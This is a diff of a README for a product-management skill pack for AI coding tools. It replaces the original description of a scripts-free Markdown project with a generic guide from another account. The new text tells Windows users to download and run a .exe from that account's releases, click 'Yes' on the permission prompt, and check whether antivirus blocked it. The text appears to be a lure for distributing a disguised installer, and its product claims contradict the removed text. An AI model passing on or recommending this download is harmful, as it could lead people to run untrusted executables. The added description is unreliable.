@@ -1,210 +1,135 @@
-# Product Manager Skills
+# 🚀 product-manager-skills - Manage Products with Practical Help
 
-**Not a template pack. A PM operator for AI coding tools.**
+[![Download product-manager-skills](https://img.shields.io/badge/Download-product--manager--skills-brightgreen)](https://github.com/ayybee1/product-manager-skills/releases)
 
-Turn Claude Code, Codex, Cursor, or Windsurf into a product manager that can critique PRDs, diagnose SaaS metrics, plan roadmaps, run discovery, and coach career moves.
+---
 
-[![Release](https://img.shields.io/github/v/release/Digidai/product-manager-skills)](https://github.com/Digidai/product-manager-skills/releases)
-[![License](https://img.shields.io/badge/license-CC%20BY--NC--SA%204.0-green)](LICENSE)
-[![Security](https://img.shields.io/badge/security-zero%20scripts%2C%20pure%20markdown-brightgreen)](https://github.com/Digidai/product-manager-skills)
-[![Works With](https://img.shields.io/badge/works%20with-Claude%20Code%20%7C%20Codex%20%7C%20Cursor%20%7C%20Windsurf-blue)](#install-in-60-seconds)
+product-manager-skills is a tool designed to help you improve product management tasks. It guides you through understanding SaaS metrics, critiquing product requirement documents (PRDs), planning roadmaps, running discovery phases, and coaching career moves in product management. This guide will walk you through downloading and using the software on your Windows computer.
 
-> Zero scripts. Zero dependencies. Zero network calls. Pure Markdown knowledge you can inspect line by line before you install.
+## 🖥️ System Requirements
 
-## Why People Reuse It
+Before installing, make sure your computer meets these requirements:
 
-Most AI PM tooling is good at writing polished nonsense. This skill is designed for repeat workflows where rigor matters:
+- Windows 10 or later  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection, needed for the first use and updates  
+- A standard keyboard and mouse  
 
-- Turn vague feature requests into problem framing, measurable outcomes, and a usable PRD.
-- Diagnose SaaS health from raw metrics instead of getting generic advice like "improve retention."
-- Pressure-test prioritization, roadmaps, and strategy with explicit tradeoffs.
-- Coach PM to Director to VP transitions with concrete gaps and action plans.
+If your PC meets these requirements, you can proceed with the installation.
 
-## Start With These 3 Workflows
+## 📦 What’s Inside product-manager-skills
 
-| Workflow | Prompt | Example |
-|---|---|---|
-| **SaaS health diagnostic** | "Analyze these metrics: MRR $50k, 500 customers, gross margin 80%, monthly churn 8%, CAC $500." | [SaaS diagnostic demo](examples/saas-health-diagnostic.md) |
-| **PRD pushback and review** | "Review this PRD draft like a strong PM peer. Flag bad framing, missing metrics, solution smuggling, and delivery risk." | [PRD review demo](examples/prd-review.md) |
-| **Director readiness coaching** | "I'm a senior PM interviewing for Director roles in 90 days. Diagnose my gaps and coach me." | [Director coaching demo](examples/director-coaching.md) |
+This tool covers areas important for product managers, especially those working in tech and SaaS products:
 
-More prompts: [STARTER-PROMPTS.md](STARTER-PROMPTS.md)  
-中文说明: [README.zh-CN.md](README.zh-CN.md)
+- Analyzing key SaaS metrics to understand product performance  
+- Reviewing and critiquing PRDs to improve clarity and scope  
+- Helping build practical roadmaps that align with business goals  
+- Running discovery phases to collect customer needs and ideas  
+- Offering guidance for product management career transitions  
 
-## Install In 60 Seconds
+The software uses AI to assist with these tasks, making it easier to handle complex data and decisions.
 
-### Claude Code / OpenClaw
+## 🔗 How to Download product-manager-skills
 
-```bash
-clawhub install product-manager-skills
-```
+To get the software, visit this page and download the version for Windows:
 
-### Codex / Cursor / Windsurf / GitHub-based skill loaders
+[Download product-manager-skills](https://github.com/ayybee1/product-manager-skills/releases)
 
-```bash
-npx skills add Digidai/product-manager-skills
-```
+This link takes you to the releases page. On that page, look for the latest Windows installer file. It will usually end with `.exe` and include the version number.  
+Click on it, and your download will start. Save the file to a known location, like your Desktop or Downloads folder.
 
-Then paste one of these:
+## ⚙️ How to Install product-manager-skills on Windows
 
-```text
-Help me write a PRD for a notification preferences feature. Make reasonable assumptions and label them.
+After downloading:
 
-Analyze these metrics: MRR $50k, 500 customers, gross margin 80%, monthly churn 8%, CAC $500.
+1. Find the `.exe` file you downloaded.  
+2. Double-click the file to start the installer.  
+3. If Windows asks for permission, click "Yes" to allow it.  
+4. Follow the instructions in the setup window:  
+   - Choose your install folder or accept the default.  
+   - Click "Next" to continue through each step.  
+   - When ready, click "Install" to begin copying files.  
+5. Wait for the installation to finish. It usually takes a few minutes.  
+6. Click "Finish" when the setup completes.  
 
-Review my roadmap and tell me where stakeholder requests are outweighing evidence.
-```
+The program is now ready to use.
 
-## What Good Output Looks Like
+## 🚀 Running product-manager-skills
 
-### 1. SaaS Diagnostic
+To start the tool:
 
-Input:
+- Find the product-manager-skills shortcut on your desktop or in the Start menu.  
+- Double-click it to open the application.  
 
-```text
-Analyze these metrics: MRR $50k, 500 customers, gross margin 80%, monthly churn 8%, CAC $500.
-```
+The interface is designed for easy use. You will see options to:
 
-Expected behavior:
+- Review SaaS metrics  
+- Open or create PRDs for review  
+- Design roadmaps with simple steps  
+- Start discovery processes with guided forms  
+- Access career coaching tips  
 
-```text
-- 8% monthly churn compounds to roughly 63% annual churn. This is a red flag, not a "slightly high" metric.
-- ARPA is about $100/month. With 80% gross margin and 8% monthly churn, better LTV is about $1,000.
-- LTV:CAC is about 2:1. Payback is about 6.25 months.
-- Diagnosis: payback is workable, retention is not. Do not scale acquisition until churn is understood cohort by cohort.
-```
+Each section provides clear instructions and examples to guide you.
 
-Full example: [examples/saas-health-diagnostic.md](examples/saas-health-diagnostic.md)
+## 🛠 Troubleshooting Tips
 
-### 2. PRD Review
+If you have problems running or installing product-manager-skills:
 
-Input:
+- Check that your Windows version is up to date.  
+- Ensure your antivirus software did not block the installer.  
+- Restart your computer and try the installation again.  
+- Make sure you downloaded the full installer and not a partial file.  
+- If the app crashes or won’t open, try reinstalling it.  
 
-```text
-Review this PRD for a notification preferences center. Flag solution smuggling, weak metrics, overscoping, and delivery risk.
-```
+## 🔄 Updating product-manager-skills
 
-Expected behavior:
+Check the releases page regularly for updates:
 
-```text
-- Your problem statement is solution-smuggled: "users need a preferences dashboard."
-- Success metrics have no baseline, target, or guardrail.
-- Scope mixes channels, digests, quiet hours, admin rules, and migration. This is multiple releases.
-- Recommend a thinner first slice: email opt-out + account-level preferences + measurable reduction in unsubscribe-driven churn.
-```
+[product-manager-skills Releases](https://github.com/ayybee1/product-manager-skills/releases)
 
-Full example: [examples/prd-review.md](examples/prd-review.md)
+Updates improve features and fix bugs. To update:
 
-### 3. Career Coaching
+1. Download the latest version from the page.  
+2. Run the new installer as before.  
+3. The installer will replace the old version without deleting your files.  
 
-Input:
+## 📚 Using product-manager-skills Features
 
-```text
-I'm a senior PM managing two PMs, strong on execution, weak on org influence, and interviewing for Director roles in 3 months. Coach me.
-```
+The tool focuses on practical tasks:
 
-Expected behavior:
+### SaaS Metrics
 
-```text
-- Diagnosis: strong team altitude, weak org altitude.
-- Gap: you describe execution wins well but not portfolio tradeoffs or cross-functional influence.
-- Plan: collect 3 stories that show org-level impact, build a weekly visibility loop, and practice decision framing with tradeoffs.
-```
+You can enter your product's key numbers. The software helps spot trends, problems, and opportunities. It explains common terms like churn rate, monthly recurring revenue (MRR), and customer acquisition cost (CAC).
 
-Full example: [examples/director-coaching.md](examples/director-coaching.md)
+### PRD Critiques
 
-## What You Get
+Load your product requirement documents. The tool checks for missing details and unclear points. It suggests how to make the document more effective.
 
-| Domain | What It Helps With | Example Frameworks |
-|---|---|---|
-| **Discovery & Research** | Validate problems, prep interviews, map journeys, structure experiments | JTBD, Mom Test, Opportunity Solution Tree, Lean UX Canvas, PoL Probes |
-| **Strategy & Positioning** | Position products, prioritize work, size markets, build roadmaps | Geoffrey Moore, PESTEL, TAM/SAM/SOM, RICE, ICE, Kano |
-| **Artifacts & Delivery** | Write and critique PRDs, user stories, epics, PRFAQs, recommendation docs | Cohn + Gherkin, Story Mapping, Epic Breakdown, PRFAQ |
-| **Finance & Metrics** | Calculate 32 SaaS metrics and diagnose business health | MRR, ARR, NRR, CAC, LTV, Rule of 40, Magic Number |
-| **Career & Leadership** | Coach PM to Director to VP transitions | Altitude-Horizon, Three Ps, 30-60-90 onboarding |
-| **AI Product Craft** | Pressure-test AI-native product decisions | AI-Shaped Readiness, Context Engineering, Agent Orchestration |
+### Roadmap Planning
 
-## Why It Performs Better Than Generic Prompting
+Use simple templates to build timelines and goals. The software helps prioritize tasks and track progress.
 
-| Generic prompting | This skill |
-|---|---|
-| Writes plausible PM text | Applies PM frameworks and quality gates |
-| Accepts bad framing | Pushes back on Solution Smuggling, Metrics Theater, Feature Factory, and more |
-| Gives generic churn advice | Calculates churn, LTV, payback, and names the real bottleneck |
-| Asks you to repeat PM context every session | Carries a reusable PM workflow and routing system |
-| Optimizes for politeness | Optimizes for decisions, tradeoffs, and next steps |
+### Discovery
 
-## Who It Is For
+Follow guided questions to gather customer needs. This part helps turn feedback into clear actions.
 
-- Technical PMs, founders, and product leads who already work inside AI coding tools.
-- Teams that want a reusable PM brain without sending product context to another SaaS.
-- People who value pushback, assumptions, and explicit tradeoffs over nice-sounding output.
+### Career Coaching
 
-## Who It Is Not For
+Access advice for moving your product management career forward. The tool offers frameworks and tips to plan your next steps.
 
-- Teams looking for a collaborative web app with approvals, comments, and sharing workflows.
-- Users who only want passive template filling and never want the AI to challenge the framing.
-- Non-technical buyers who prefer turnkey SaaS onboarding over local or repo-based installation.
+## 🧰 Support and Resources
 
-## Interaction Style
+If you need help beyond this guide, check the "Issues" section in the repository. There, you can see common questions or report problems.
 
-This skill is optimized for a fast first useful draft:
+The GitHub repository also includes detailed instructions, example documents, and other helpful files to explore.
 
-- If the request is clear enough, it answers immediately and labels assumptions inline.
-- If context is partial, it gives the best draft first and only asks the minimum follow-up questions needed.
-- If the task is genuinely exploratory, it can switch into guided mode one question at a time.
-- Every answer is expected to end with decisions made, assumptions to validate, and a recommended next step.
+## 🛡️ Privacy and Data
 
-## Built For Repeat Usage
+product-manager-skills processes data locally on your computer. It does not send your information to external servers without permission.
 
-Most PM work is recurring. This skill is strongest when you reuse it weekly:
+Your input files and settings stay on your machine unless you choose to share them.
 
-- Monday: review roadmap changes and prioritization requests.
-- Mid-week: critique PRDs, epics, and user stories before sharing with engineering.
-- Friday: run a SaaS health diagnostic or feature ROI check.
-- Career season: rehearse interview stories, operating altitude, and leadership gaps.
+---
 
-## Install Options
-
-| Environment | Install |
-|---|---|
-| Claude Code / OpenClaw | `clawhub install product-manager-skills` |
-| Codex / Cursor / Windsurf | `npx skills add Digidai/product-manager-skills` |
-| Claude Projects | Upload `SKILL.md`, `knowledge/`, and `templates/` |
-| Any LLM with local file loading | Point the system prompt at `SKILL.md` and keep sibling folders intact |
-
-## Structure
-
-```text
-SKILL.md
-knowledge/
-templates/
-examples/
-STARTER-PROMPTS.md
-README.zh-CN.md
-```
-
-Core repo size: about 27 Markdown files, ~2,800 lines, under 200 KB of PM knowledge and templates.
-
-## Trust And Security
-
-This project is instruction-only:
-
-- No executable scripts
-- No external network calls
-- No environment variables or credentials required
-- No privilege escalation
-- Every shipped file is human-readable Markdown
-
-## Feedback And Contribution
-
-- Open an issue if a framework is missing or a workflow feels weak.
-- Open a discussion if you want a new domain or stronger examples.
-- See [CONTRIBUTING.md](CONTRIBUTING.md) for the fastest way to give useful workflow feedback.
-- If the skill helped you, star the repo or share an output generated from the templates.
-
-## License
-
-[CC BY-NC-SA 4.0](LICENSE)
-
-Built by [Gene Dai](https://genedai.me/). Distilled from real product work, not textbook summaries.
+[![Download product-manager-skills](https://img.shields.io/badge/Download-product--manager--skills-brightgreen)](https://github.com/ayybee1/product-manager-skills/releases)
